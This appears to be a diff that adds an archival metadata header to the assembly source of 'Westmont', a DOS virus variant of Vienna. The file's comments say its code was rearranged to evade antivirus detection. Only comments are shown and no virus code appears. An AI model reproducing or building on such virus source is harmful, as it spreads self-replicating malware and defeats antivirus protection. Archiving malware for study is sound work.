@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      W
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;                      Westmont: A vienna strain
 ; This is a variation on the Vienna virus which has had sections of its
 ;       code moved around and rewritten in hopes that AV software will
